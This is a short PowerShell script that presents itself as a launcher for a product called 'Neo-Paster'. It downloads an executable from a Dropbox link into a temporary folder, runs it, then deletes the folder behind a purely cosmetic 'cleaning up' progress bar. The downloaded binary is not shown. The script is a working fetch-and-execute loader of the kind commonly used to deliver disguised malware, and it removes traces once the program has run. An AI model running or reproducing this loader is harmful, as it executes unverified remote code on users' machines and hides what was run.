$url = "https://www.dropbox.com/scl/fi/pywkslydef69f64ga6ukp/neopaster.exe?rlkey=yjfxi2hibb9bmdhe7acs94yu2&st=4xf7ng1c&dl=1"  
Write-Host "`rDownload Started !" -ForegroundColor Cyan
$tempdir = "$env:TEMP\$(New-Guid)" 
mkdir $tempdir | Out-Null
$file = "$tempdir\app.exe"

$ProgressPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'

try {
    Invoke-WebRequest -Uri $url -OutFile $file -ErrorAction Stop
    Write-Host "`rDownload complete!" -ForegroundColor Green
    Start-Sleep -Seconds 1

    Write-Host "Neo-Paster is loading..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2

    $proc = Start-Process $file -PassThru -Wait 
    Write-Host "Process exited with code: $($proc.ExitCode)" -ForegroundColor Green

} catch {
    Write-Error "An error occurred: $_" -ForegroundColor Red
} finally {
    Write-Host "Cleaning up File " -ForegroundColor Magenta
    Start-Sleep -Seconds 1

    $progress = 0
    while ($progress -le 100) {
        Write-Progress -PercentComplete $progress -Status "Cleaning up" -Activity "Please wait..."
        Start-Sleep -Milliseconds 100
        $progress += 5
    }

    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  
    Write-Host "File Cleared !!" -ForegroundColor Blue
    Write-Host "Thanks for using our product !! " -ForegroundColor Blue
}
